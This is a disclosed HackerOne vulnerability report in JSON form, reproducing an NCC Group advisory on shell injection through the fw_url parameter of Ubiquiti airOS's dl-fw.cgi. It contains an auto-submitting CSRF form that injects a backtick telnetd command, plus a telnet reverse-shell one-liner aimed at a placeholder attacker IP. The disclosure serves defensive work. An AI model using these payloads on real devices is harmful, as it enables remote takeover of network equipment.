{
  "id": 121940,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjE5NDA=",
  "url": "https://hackerone.com/reports/121940",
  "title": "Shell Injection via Web Management Console (dl-fw.cgi)",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-03-10T04:01:09.590Z",
  "submitted_at": "2016-03-10T04:01:09.590Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mornaner",
    "url": "/mornaner",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 800,
    "url": "https://hackerone.com/ui",
    "handle": "ui",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ubiquiti Inc.",
      "twitter_handle": "ubiquiti",
      "website": "https://ui.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-10-15T22:40:55.393Z",
  "bug_reporter_agreed_on_going_public_at": "2016-09-15T22:40:53.617Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "NCC Group Security Advisory\nhttps://www.nccgroup.trust\n--------------------------------------------\n\nShell Injection via Web Management Console\n\nVendor: Ubiquiti Networks\nVendor URL: https://www.ubnt.com\nVersions affected: airOS XM board line (potentially all airOS lines, unverified)\nSystems Affected: AG-HP-2G16, AG-HP-2G20, AG-HP-5G23, AG-HP-5G27, AirGrid M,\nAirGrid M2, AirGrid M5, AR, AR-HP, BM2HP, BM2-Ti, BM5HP, BM5-Ti, LiteStation M5,\nlocoM2, locoM5, locoM9, M2, M3, M365, M5, M900, NB-2G18, NB-5G22, NB-5G25, NBM3,\nNBM365, NBM9, NSM2, NSM3, NSM365, NSM5, PBM10, PBM3, PBM365, PBM5, PICOM2HP,\nPower AP N (Verified on AR-HP running firmware v5.6.3)\nAuthor: Joel St. John <joel.stjohn[at]nccgroup[dot]trust>\nRisk: High\n\nSummary:\n--------\nThe dl-fw.cgi script does not properly sanitize URLs passed via the fw_url parameter, allowing\narbitrary shell commands to be provided as part of the input.\n\nLocation: \n---------\n/usr/www/dl-fw.cgi\n\nImpact:\n-------\nThis issue can be used to execute arbitrary shell commands on the device.\n \nDetails:\n--------\nThe airOS XM, XW, and TI lines (and potentially others) all contain a utility script\ncalled dl-fw.cgi that is hosted in the webroot. This script is used in conjunction\nwith other functionality to download/display EULAs and download firmware updates.\n\nThis script can be called directly via POSTs, since it is within the webroot. On Line 62-63,\nthe script executes the following using a specified fw_url parameter:\n\n62: $cmd = \"$cmd_wget -O $firmware_file --header='Referer: $eula_url ' $fw_url > $progress_file 2>&1\";\n63: exec($cmd, $lines, $res);\n\nNo sanitization is performed on fw_url, which allows an attacker to specify arbitrary shell commands\nwhich are in turn passed to exec. For instance, the following example uses the URL\nhttp://www.nccgroup.trust/testtest123/`telnetd`, along with a cross-site request forgery attack\nto start the telnet service:\n\n<html>\n  <body>\n    <form action=\"https://192.168.1.1/dl-fw.cgi\" method=\"POST\">\n      <input type=\"hidden\" name=\"action\" value=\"download\" />\n      <input type=\"hidden\" name=\"fw&#95;url\" value=\"http&#58;&#47;&#47;www&#46;nccgroup&#46;trust&#47;testtest123&#47;&#96;telnetd&#96;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\nThis can also be used to open a reverse shell via telnet, for instance by injecting:\n\ntelnet <attacker ip> <port1> | /bin/sh | telnet <attacker ip> port2\n\nRecommendation:\n----------------\nSanitize the fw_url parameter to remove/encode shell metacharacters using EscapeShellCmd\n(as done elsewhere) or similar methods.\n\nAbout NCC Group:\n--------------------\nNCC Group is a global expert in cyber security and risk mitigation, working with businesses to protect their brand, value and reputation against the ever-evolving threat landscape. Our Security Consulting services leverage our extensive knowledge of current security vulnerabilities, penetration testing techniques and software development best practices to enable organizations to secure their applications against ever-present threats. At NCC Group we can boast unrivaled talent and recognized world-class security expertise. Bringing together best in class security consultancies iSEC Partners, Intrepidus Group, Matasano, NCC Group and NGS we have created one of the largest, most respected security consultancies in the world.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-10-15T22:40:53.758Z",
  "allow_singular_disclosure_after": -231254428.07964864,
  "singular_disclosure_allowed": true,
  "vote_count": 19,
  "voters": [
    "michiel",
    "mornaner",
    "dsopas",
    "madrobot",
    "ibram",
    "ak1t4",
    "need_new_username_103",
    "chernobyl",
    "exception",
    "sumit7",
    "and 9 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
